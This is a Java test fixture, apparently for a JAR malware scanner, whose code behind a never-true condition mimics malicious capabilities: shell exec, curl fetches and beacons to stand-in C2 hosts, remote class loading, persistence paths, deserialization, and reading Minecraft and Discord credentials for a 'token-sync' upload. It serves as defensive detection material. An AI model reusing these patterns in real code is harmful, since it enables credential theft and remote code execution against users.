package com.jarspect.fixtures;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.file.Files;
import java.nio.file.Path;

public final class AllCapabilities {
    private static final String DEMO_RUNTIME_EXEC_TOKEN = "Runtime.getRuntime().exec";
    private static final String DEMO_PAYLOAD_URL = "https://payload.example.invalid/bootstrap";
    private static final String DEMO_C2_DOMAIN = "c2.jarspect.example.invalid";
    private static final String WINDOWS_RUN_KEY = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    private static final String SYSTEMD_MARKER = "/etc/systemd/system/demo-updater.service";
    private static final String CRON_MARKER = "/etc/cron.d/demo-updater";
    private static final String SCHTASKS_MARKER = "schtasks /create /tn demo-updater";
    private static final String CREDENTIAL_MARKERS = "discord Local Storage leveldb token Login Data Cookies session";
    private static final String MINECRAFT_MARKERS = ".minecraft/launcher_profiles.json accounts.json";
    private static final String NATIVE_SO_PATH = "native/demo.so";

    private AllCapabilities() {}

    private static boolean unreachable() {
        return System.nanoTime() == Long.MIN_VALUE;
    }

    public static void inert() {
        if (unreachable()) {
            triggerExec();
            triggerNetwork();
            triggerDynamicLoad();
            triggerFilesystemWrite();
            triggerPersistenceMarkers();
            triggerDeserialization();
            triggerNativeLoad();
            triggerCredentialAccess();
        }
    }

    private static void triggerExec() {
        try {
            Runtime.getRuntime().exec("cmd.exe /c whoami");
            new ProcessBuilder("/bin/sh", "-c", "curl -fsSL https://payload.example.invalid/bootstrap").start();
        } catch (IOException ignored) {
            // Intentionally unreachable, compile-time fixture only.
        }
    }

    private static void triggerNetwork() {
        try {
            URL bootstrap = new URL(DEMO_PAYLOAD_URL);
            bootstrap.openConnection().connect();
            URL beacon = new URL("https://" + DEMO_C2_DOMAIN + "/collect");
            beacon.openConnection().connect();
        } catch (IOException ignored) {
            // Intentionally unreachable, compile-time fixture only.
        }
    }

    private static void triggerDynamicLoad() {
        try {
            URL[] sources = new URL[] {new URL(DEMO_PAYLOAD_URL)};
            URLClassLoader.newInstance(sources);
            Class.forName("java.lang.Runtime");
        } catch (Exception ignored) {
            // Intentionally unreachable, compile-time fixture only.
        }

        String reflectiveToken = "defineClass";
        String nativeToken = "loadLibrary";
        String runtimeToken = "java/lang/Runtime";
        if (reflectiveToken.equals(nativeToken) && runtimeToken.isEmpty()) {
            throw new IllegalStateException("Never reached");
        }
    }

    private static void triggerFilesystemWrite() {
        try {
            Files.write(Path.of("mods/demo-output.txt"), "fixture".getBytes());
            Files.write(Path.of("../mods/payload.jar"), "archive".getBytes());
        } catch (IOException ignored) {
            // Intentionally unreachable, compile-time fixture only.
        }
    }

    private static void triggerPersistenceMarkers() {
        if (WINDOWS_RUN_KEY.isEmpty() || SYSTEMD_MARKER.isEmpty() || CRON_MARKER.isEmpty() || SCHTASKS_MARKER.isEmpty()) {
            throw new IllegalStateException("Never reached");
        }
    }

    private static void triggerDeserialization() {
        try (ObjectInputStream stream =
                new ObjectInputStream(new ByteArrayInputStream(new byte[] {(byte) 0xAC, (byte) 0xED, 0x00, 0x05, 0x70}))) {
            stream.readObject();
        } catch (Exception ignored) {
            // Intentionally unreachable, compile-time fixture only.
        }
    }

    private static void triggerNativeLoad() {
        System.loadLibrary("demo_native_fixture");
        if (NATIVE_SO_PATH.isEmpty()) {
            throw new IllegalStateException("Never reached");
        }
    }

    private static void triggerCredentialAccess() {
        try {
            Files.readAllBytes(Path.of(".minecraft/launcher_profiles.json"));
            URL exfil = new URL("https://" + DEMO_C2_DOMAIN + "/token-sync");
            exfil.openConnection().connect();
        } catch (IOException ignored) {
            // Intentionally unreachable, compile-time fixture only.
        }

        if (CREDENTIAL_MARKERS.equals(MINECRAFT_MARKERS) || DEMO_RUNTIME_EXEC_TOKEN.isEmpty()) {
            throw new IllegalStateException("Never reached");
        }
    }
}
